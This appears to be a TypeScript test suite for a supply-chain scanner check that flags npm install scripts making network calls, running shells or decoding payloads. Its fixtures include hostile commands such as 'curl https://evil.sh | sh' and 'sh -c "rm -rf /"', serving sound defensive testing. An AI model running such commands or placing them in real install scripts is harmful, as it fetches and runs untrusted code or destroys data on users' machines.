import type { CheckInput } from '../analyzer.types.js';
import { installScriptsCheck } from './install-scripts.check.js';

const input = (scripts: Record<string, string>) =>
  ({ registryVersion: { scripts } }) as unknown as CheckInput;

const patternsOf = async (script: string) => {
  const [finding] = await installScriptsCheck.run(
    input({ postinstall: script }),
  );
  return finding.details?.patterns;
};

describe('installScriptsCheck', () => {
  it('finds nothing without install scripts', async () => {
    const findings = await installScriptsCheck.run(
      input({ test: 'vitest', build: 'tsc' }),
    );

    expect(findings).toEqual([]);
  });

  it('flags a plain build script as low', async () => {
    const findings = await installScriptsCheck.run(
      input({ install: 'node-gyp rebuild' }),
    );

    expect(findings).toEqual([
      {
        checkType: 'install_scripts',
        severity: 'low',
        summary: 'install script runs on install',
        evidence: 'node-gyp rebuild',
        details: { script: 'install', patterns: [] },
      },
    ]);
  });

  it('flags a risky script as high with the script text as evidence', async () => {
    const findings = await installScriptsCheck.run(
      input({ postinstall: 'curl https://evil.sh | sh' }),
    );

    expect(findings).toEqual([
      {
        checkType: 'install_scripts',
        severity: 'high',
        summary:
          'postinstall script makes network calls and runs shell commands',
        evidence: 'curl https://evil.sh | sh',
        details: {
          script: 'postinstall',
          patterns: ['network call', 'shell execution'],
        },
      },
    ]);
  });

  it('makes one finding per install script', async () => {
    const findings = await installScriptsCheck.run(
      input({ preinstall: 'node check.js', postinstall: 'wget x.io/a' }),
    );

    expect(findings.map((finding) => finding.severity)).toEqual([
      'low',
      'high',
    ]);
  });

  it.each([
    'curl -s example.com',
    'wget example.com/a.sh',
    'node -e "fetch(\'https://example.com\')"',
    'powershell Invoke-WebRequest example.com',
  ])('spots a network call in %s', async (script) => {
    expect(await patternsOf(script)).toContain('network call');
  });

  it.each([
    'cat a.sh | bash',
    'sh -c "rm -rf /"',
    'node -e "eval(code)"',
    'node -e "require(\'child_process\').exec(cmd)"',
  ])('spots shell execution in %s', async (script) => {
    expect(await patternsOf(script)).toContain('shell execution');
  });

  it.each([
    'echo aGVsbG8= | base64 -d',
    'node -e "atob(x)"',
    'node -e "\\x63\\x75\\x72\\x6c"',
    'node -e "run(\'aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQ=\')"',
  ])('spots an encoded payload in %s', async (script) => {
    expect(await patternsOf(script)).toContain('encoded payload');
  });

  it.each(['node install.js', 'node-gyp rebuild', 'prebuild-install || tsc'])(
    'finds no risky pattern in %s',
    async (script) => {
      expect(await patternsOf(script)).toEqual([]);
    },
  );
});
